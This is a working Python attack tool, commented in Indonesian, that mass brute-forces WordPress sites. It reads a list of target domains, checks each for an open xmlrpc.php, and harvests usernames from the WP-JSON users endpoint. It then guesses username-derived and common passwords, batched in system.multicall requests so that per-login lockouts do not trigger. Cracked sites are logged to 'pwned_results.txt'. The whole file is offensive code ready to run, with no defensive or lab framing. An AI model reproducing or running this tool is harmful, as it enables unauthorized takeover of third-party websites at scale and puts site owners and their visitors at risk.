import requests
import concurrent.futures
import urllib3
import sys

# Matikan warning SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- KONFIGURASI ---
INPUT_FILE = 'list_domain.txt'    # File berisi list domain target
OUTPUT_FILE = 'pwned_results.txt' # File hasil crack
THREADS = 20                      # Kecepatan thread
TIMEOUT = 10                      # Detik

# Header
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Win64; x64) Chrome/90.0.4430.93 Safari/537.36',
    'Content-Type': 'text/xml'
}

# --- LOGIKA SMART PASSWORD ---
def generate_smart_passwords(username):
    """
    Membuat list password dinamis berdasarkan username
    Sesuai pola: user, user@, user@1, user@12, user@123
    """
    base = username.lower()
    passwords = [
        base,               # admin
        f"{base}123",       # admin123
        f"{base}@",         # admin@
        f"{base}@1",        # admin@1
        f"{base}@12",       # admin@12
        f"{base}@123",      # admin@123
        f"{base}12345",     # admin12345
        "password",         # password (umum)
        "123456"            # 123456 (umum)
    ]
    return list(set(passwords)) # Hapus duplikat jika ada

# --- FUNGSI UTAMA ---

def clean_url(url):
    if not url.startswith('http'):
        url = 'https://' + url
    return url.strip().rstrip('/')

def check_xmlrpc(url):
    """Cek apakah XMLRPC aktif dan menerima POST"""
    payload = """<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"""
    try:
        r = requests.post(f"{url}/xmlrpc.php", data=payload, headers=HEADERS, timeout=TIMEOUT, verify=False)
        if r.status_code == 200 and '<methodResponse>' in r.text:
            return True
    except:
        pass
    return False

def get_users_json(url):
    """Mencoba ambil username dari WP-JSON"""
    users = []
    try:
        # Override header accept untuk JSON
        h = HEADERS.copy()
        h['Accept'] = 'application/json'
        r = requests.get(f"{url}/wp-json/wp/v2/users", headers=h, timeout=TIMEOUT, verify=False)
        
        if r.status_code == 200:
            data = r.json()
            for u in data:
                if 'slug' in u:
                    users.append(u['slug'])
    except:
        pass
    
    # Jika API mati, fallback default ke 'admin'
    if not users:
        users.append('admin')
        users.append('administrator')
    
    return list(set(users))

def build_multicall(username, passwords):
    """Membungkus banyak password dalam 1 request XML"""
    calls = ""
    for pwd in passwords:
        safe_pass = pwd.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        calls += f"""
        <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
        <member><name>params</name><value><array><data>
        <value><string>{username}</string></value>
        <value><string>{safe_pass}</string></value>
        </data></array></value></member>"""
    
    return f"""<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName>
    <params><param><value><array><data>{calls}</data></array></value></param></params></methodCall>"""

def attack_domain(domain_raw):
    target = clean_url(domain_raw)
    xml_url = f"{target}/xmlrpc.php"
    
    # 1. Cek XMLRPC
    if not check_xmlrpc(target):
        print(f"[-] DEAD/PROTECTED: {target}")
        return

    # 2. Ambil User
    users = get_users_json(target)
    print(f"[*] TARGET: {target} | Users found: {users}")

    # 3. Attack per User
    for user in users:
        # Generate password pintar untuk user ini
        pass_list = generate_smart_passwords(user)
        
        # Kirim serangan (Batching semua password list dalam 1 request karena jumlahnya sedikit)
        payload = build_multicall(user, pass_list)
        
        try:
            r = requests.post(xml_url, data=payload, headers=HEADERS, timeout=TIMEOUT, verify=False)
            
            if r.status_code == 200:
                # Cek indikator sukses
                if "isAdmin" in r.text or "blogName" in r.text:
                    # Kita tau sukses, tapi script multicall tidak memberi tahu password mana yg benar secara langsung
                    # Tapi karena list "smart" kita pendek, kita log saja polanya.
                    msg = f"[!!!] CRACKED: {target} | User: {user} | Pass Pattern: {pass_list}"
                    print(f"\033[92m{msg}\033[0m") # Warna Hijau
                    
                    with open(OUTPUT_FILE, 'a') as f:
                        f.write(f"{target}/xmlrpc.php|{user}|(SmartPass)\n")
                    
                    return # Pindah ke domain selanjutnya jika sudah dapat 1
        except:
            pass

def main():
    print("--- WP SMART BRUTE FORCER (Single Script) ---")
    print(f"Logic: admin -> admin, admin@, admin@123, etc.")
    
    try:
        with open(INPUT_FILE, 'r') as f:
            domains = f.read().splitlines()
    except FileNotFoundError:
        print(f"Buat file {INPUT_FILE} dulu!")
        return

    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
        executor.map(attack_domain, domains)

    print("\n[DONE] Selesai.")

if __name__ == "__main__":
    main()
